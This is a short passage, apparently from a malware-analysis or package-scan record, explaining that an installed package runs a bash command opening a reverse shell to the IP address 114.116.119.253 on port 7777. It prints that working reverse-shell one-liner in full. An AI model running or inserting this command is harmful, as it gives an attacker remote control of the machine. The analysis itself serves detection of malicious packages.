Specifically, it runs 'bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'', which attempts to open a reverse shell connection to the remote IP address 114.116.119.253 on port 7777. This allows an attacker to gain remote access to the system where the package is installed, which is a clear example of malicious behavior.",
